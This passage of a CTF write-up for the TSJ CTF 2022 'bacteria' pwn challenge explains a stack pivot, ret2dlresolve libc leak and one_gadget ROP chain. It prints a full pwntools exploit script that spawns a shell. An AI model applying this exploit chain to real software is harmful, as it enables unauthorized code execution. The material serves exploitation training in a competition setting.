</span><span class="code-line">$ <span class="token comment"># docker cp &lt;CONTAINER ID&gt;:&lt;path/of/container&gt; &lt;path/of/host/machine&gt;</span>
</span><span class="code-line">$ <span class="token function">docker</span> <span class="token function">cp</span> 3ac3689e6140:/usr/lib/x86_64-linux-gnu/libc-2.31.so <span class="token builtin class-name">.</span>
</span></code></pre></div>
<p>Using <code>one_gadget</code> and we have the following gadget:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/one_gadget.png" alt="one_gadget.png"/></p>
<p>We will use the first one which has constraints are r12 and r15 have to be null. Examine the register and we can see that r15 is null already, all we need now is r12 have to be null. Everything is easy when we have libc. Using <code>ROPgadget</code> and we can get this:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ ROPgadget --binary libc-2.31.so --ropchain <span class="token operator">|</span> <span class="token function">grep</span> xor <span class="token operator">|</span> <span class="token function">grep</span> r12 <span class="token operator">|</span> <span class="token function">grep</span> ret
</span><span class="code-line"><span class="token punctuation">..</span>.
</span><span class="code-line"><span class="token punctuation">..</span>.
</span><span class="code-line">0x00000000000d31f0 <span class="token builtin class-name">:</span> xor r12d, r12d <span class="token punctuation">;</span> mov rax, r12 <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> ret
</span></code></pre></div>
<p>We will use this to clear the r12. I use xor because we don’t need to add those <code>p64(0)</code> then pop in a limited space like this situation. Before we continue, let choose any address for rbp in the write of ret2dlresolve so that it will jump to there after the leak. I will choose the rw_section (because now we don’t need stack more) so the code for ret2dlresolve will look like this:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Conduct ret2dlresolve</span>
</span><span class="code-line">dlresolver <span class="token operator">=</span> <span class="token number">0x401000</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section<span class="token punctuation">)</span>           <span class="token comment"># Fake rbp, choose random writable address</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>dlresolver<span class="token punctuation">)</span>          <span class="token comment"># Dlresolver</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>reloc_arg<span class="token punctuation">)</span>           <span class="token comment"># Fake reloc_arg</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>    <span class="token comment"># Return address</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>And now, after the leak it will get input from us again. Just pass that xor 12 and one gadget, we created the shell:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">one_gadget <span class="token operator">=</span> <span class="token number">0xe6c7e</span>
</span><span class="code-line">xor_r12_pop_r12 <span class="token operator">=</span> <span class="token number">0xd31f0</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                               <span class="token comment"># Fake rbp, not use more</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> xor_r12_pop_r12<span class="token punctuation">)</span>    <span class="token comment"># rip</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                              <span class="token comment"># For that pop r12</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> one_gadget<span class="token punctuation">)</span>         <span class="token comment"># Return address</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Full code:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token keyword">import</span> subprocess
</span><span class="code-line"><span class="token keyword">import</span> time
</span><span class="code-line"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
</span><span class="code-line">
</span><span class="code-line">context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&#x27;./bacteria&#x27;</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># context.log_level = &#x27;debug&#x27;</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">GDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#x27;ps&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;aux&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
</span><span class="code-line">	ps <span class="token operator">=</span> proc<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&#x27;\n&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">	pid <span class="token operator">=</span> <span class="token string">&#x27;&#x27;</span>
</span><span class="code-line">	<span class="token keyword">for</span> i <span class="token keyword">in</span> ps<span class="token punctuation">:</span>
</span><span class="code-line">		<span class="token keyword">if</span> <span class="token string">b&#x27;/home/bacteria/bacteria&#x27;</span> <span class="token keyword">in</span> i <span class="token keyword">and</span> <span class="token string">b&#x27;timeout&#x27;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>
</span><span class="code-line">			pid <span class="token operator">=</span> i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&#x27;    &#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&#x27;  &#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">			log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#x27;Process pid: &#x27;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">	command <span class="token operator">=</span> <span class="token triple-quoted-string string">&#x27;&#x27;&#x27;
</span></span><span class="code-line"><span class="token triple-quoted-string string">	b*0x401040
</span></span><span class="code-line"><span class="token triple-quoted-string string">	c
</span></span><span class="code-line"><span class="token triple-quoted-string string">	c
</span></span><span class="code-line"><span class="token triple-quoted-string string">	c
</span></span><span class="code-line"><span class="token triple-quoted-string string">	c
</span></span><span class="code-line"><span class="token triple-quoted-string string">set $JMPREL = 0x400300
</span></span><span class="code-line"><span class="token triple-quoted-string string">set $SYMTAB = 0x400290
</span></span><span class="code-line"><span class="token triple-quoted-string string">set $STRTAB = 0x4002c0
</span></span><span class="code-line"><span class="token triple-quoted-string string">set $reloc_arg = 632
</span></span><span class="code-line"><span class="token triple-quoted-string string">x/3xg $JMPREL + $reloc_arg*24
</span></span><span class="code-line"><span class="token triple-quoted-string string">x/3xg $SYMTAB + ( 0x0000027a00000007 &gt;&gt; 32 )*24
</span></span><span class="code-line"><span class="token triple-quoted-string string">x/s $STRTAB + 0x3bc0
</span></span><span class="code-line"><span class="token triple-quoted-string string">	&#x27;&#x27;&#x27;</span>
</span><span class="code-line">	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#x27;/tmp/command.gdb&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;wt&#x27;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
</span><span class="code-line">	        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
</span><span class="code-line">	subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#x27;sudo&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;--geometry&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;960x1080+960+0&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;-e&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;gdb&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;-p&#x27;</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token string">&#x27;-x&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;/tmp/command.gdb&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment"># input() to make program wait with gdb</span>
</span><span class="code-line">p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">&#x27;127.0.0.1&#x27;</span><span class="token punctuation">,</span> <span class="token number">9487</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># p = connect(&#x27;34.81.158.137&#x27;, 9487)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># GDB()</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">############################</span>
</span><span class="code-line"><span class="token comment">### Stage 1: Stack pivot ###</span>
</span><span class="code-line"><span class="token comment">############################</span>
</span><span class="code-line">rw_section <span class="token operator">=</span> <span class="token number">0x403e00</span>
</span><span class="code-line">mov_rsi_rbp_read <span class="token operator">=</span> <span class="token number">0x401027</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment"># Fake rbp</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>    <span class="token comment"># rip</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>                 <span class="token comment"># Just for padding so that we don’t need to sleep()</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">########################################################</span>
</span><span class="code-line"><span class="token comment">### Stage 2: Fake address and structure of Elf64_Sym ###</span>
</span><span class="code-line"><span class="token comment">########################################################</span>
</span><span class="code-line">SYMTAB <span class="token operator">=</span> <span class="token number">0x400290</span>
</span><span class="code-line">
</span><span class="code-line">Elf64_Sym_addr <span class="token operator">=</span> rw_section
</span><span class="code-line">symbol_number  <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>Elf64_Sym_addr <span class="token operator">-</span> SYMTAB<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">24</span> <span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">st_name <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">15296</span><span class="token punctuation">)</span>        <span class="token comment"># Change here</span>
</span><span class="code-line">st_info <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>
</span><span class="code-line">st_other <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">st_shndx <span class="token operator">=</span> p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">st_value <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># st_size is null already because the stack now contain all null byte</span>
</span><span class="code-line"><span class="token comment"># so we don’t need to write these variable, just need to pad full 0x10</span>
</span><span class="code-line"><span class="token comment"># bytes so that we don’t need to sleep()</span>
</span><span class="code-line">Elf64_Sym_struct <span class="token operator">=</span> st_name <span class="token operator">+</span> st_info <span class="token operator">+</span> st_other <span class="token operator">+</span> st_shndx <span class="token operator">+</span> st_value
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">#########################################################</span>
</span><span class="code-line"><span class="token comment">### Stage 3: Fake address and structure of Elf64_Rela ###</span>
</span><span class="code-line"><span class="token comment">#########################################################</span>
</span><span class="code-line">JMPREL <span class="token operator">=</span> <span class="token number">0x400300</span>
</span><span class="code-line">
</span><span class="code-line">Elf64_Rela_addr <span class="token operator">=</span> rw_section <span class="token operator">+</span> <span class="token number">0x40</span>
</span><span class="code-line">reloc_arg <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>Elf64_Rela_addr <span class="token operator">-</span> JMPREL<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">24</span> <span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">r_offset <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section <span class="token operator">-</span> <span class="token number">0x50</span><span class="token punctuation">)</span>         <span class="token comment"># Change here</span>
</span><span class="code-line">r_info <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>symbol_number <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># r_addend is null and stack is null already so we don’t need to write this,</span>
</span><span class="code-line"><span class="token comment"># also because we run out of 0x10 bytes we can write</span>
</span><span class="code-line">Elf64_Rela_struct <span class="token operator">=</span> r_offset <span class="token operator">+</span> r_info
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">#####################################################</span>
</span><span class="code-line"><span class="token comment">### Stage 4: Fake address and structure of STRTAB ###</span>
</span><span class="code-line"><span class="token comment">#####################################################</span>
</span><span class="code-line">STRTAB <span class="token operator">=</span> <span class="token number">0x4002c0</span>
</span><span class="code-line">
</span><span class="code-line">STRTAB_addr <span class="token operator">=</span> rw_section <span class="token operator">+</span> <span class="token number">0x80</span>
</span><span class="code-line">st_name <span class="token operator">=</span> STRTAB_addr <span class="token operator">-</span> STRTAB
</span><span class="code-line">
</span><span class="code-line">STRTAB_struct <span class="token operator">=</span> <span class="token string">b&quot;write\x00\x00\x00&quot;</span>
</span><span class="code-line">STRTAB_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">##########################################################</span>
</span><span class="code-line"><span class="token comment">### Stage 5. Conduct ret2dlresolve &amp; Leak libc address ###</span>
</span><span class="code-line"><span class="token comment">##########################################################</span>
</span><span class="code-line"><span class="token comment"># Write Elf64_Sym structure</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>Elf64_Rela_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment"># Fake rbp, write and jump to Elf64_Rela address</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> Elf64_Sym_struct
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Write Elf64_Rela structure</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>STRTAB_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>        <span class="token comment"># Fake rbp, write and jump to STRTAB address</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> Elf64_Rela_struct
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Write STRTAB structure</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section <span class="token operator">-</span> <span class="token number">0x50</span><span class="token punctuation">)</span>         <span class="token comment"># Fake rbp, write and jump to ret2dlresolve address</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> STRTAB_struct
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># print(reloc_arg)                       # Using GDB to check</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Conduct ret2dlresolve</span>
</span><span class="code-line">dlresolver <span class="token operator">=</span> <span class="token number">0x401000</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>dlresolver<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>reloc_arg<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Get leaked address</span>
</span><span class="code-line">write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&#x27;Leak address: &#x27;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> <span class="token number">0x1111d0</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&#x27;Libc base: &#x27;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">#########################</span>
</span><span class="code-line"><span class="token comment">### Stage 6: Get flag ###</span>
</span><span class="code-line"><span class="token comment">#########################</span>
</span><span class="code-line">one_gadget <span class="token operator">=</span> <span class="token number">0xe6c7e</span>
</span><span class="code-line">xor_r12_pop_r12 <span class="token operator">=</span> <span class="token number">0xd31f0</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                               <span class="token comment"># Fake rbp, not use more</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> xor_r12_pop_r12<span class="token punctuation">)</span>    <span class="token comment"># rip</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                              <span class="token comment"># For that pop r12</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> one_gadget<span class="token punctuation">)</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<h2 id="4-get-flag"><a href="#4-get-flag" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>4. Get flag</h2>
<p>I made this write up when the server closed so I was only able to obtain the fake flag:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/get_flag.png" alt="get_flag.png"/></p></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Ftsjctf-2022%2Fbacteria">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/tsjctf-2022/bacteria.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Originally published on</h2><div class="flex flex-wrap text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail/CTFNote/tree/master/writeup/2022/TSJ-CTF-2022/bacteria">github.com</a></div></div><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/tsjctf-2022/">TSJCTF-2022</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pwn/">pwn</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/shell/">Shell</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/buffer-overflow/">Buffer-Overflow</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/binary-exploit/">Binary-Exploit</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ugra-ctf-quals-2022/noteasy03/">Ugra CTF Quals 2022 – noteasy03</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ugra-ctf-quals-2022/xorxorracing/">Ugra CTF Quals 2022 – Хохорейсинг</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var d=Object.create;var l=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var m=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var o=a=\u003el(a,\"__esModule\",{value:!0});var N=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),k=(a,s)=\u003e{o(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},g=(a,s,c)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let n of h(s))!u.call(a,n)\u0026\u0026n!==\"default\"\u0026\u0026l(a,n,{get:()=\u003es[n],enumerable:!(c=p(s,n))||c.enumerable});return 